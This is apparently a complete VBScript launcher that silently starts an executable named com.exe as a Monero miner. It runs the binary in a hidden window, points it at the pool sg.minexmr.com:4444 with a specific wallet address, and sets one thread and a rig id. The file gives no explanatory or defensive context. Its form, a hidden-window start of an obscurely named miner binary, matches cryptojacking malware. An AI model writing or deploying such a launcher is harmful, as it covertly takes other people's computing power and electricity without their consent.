 DIM objShell 
 set objShell = wscript.createObject("wscript.shell") 
 iReturn = objShell.Run("cmd.exe /C D:\com.exe -o sg.minexmr.com:4444 -u 42rePSA2eRJjg7p5Vwx1ziUV8AnfyWP1CVVheV75Y7Lh5Hw8xgmriLWHSP1mmLEMsvLdTYRiyqH7KZwx3iGa47kARMrXBUx -t 1 --rig-id=xmw1", 0, TRUE)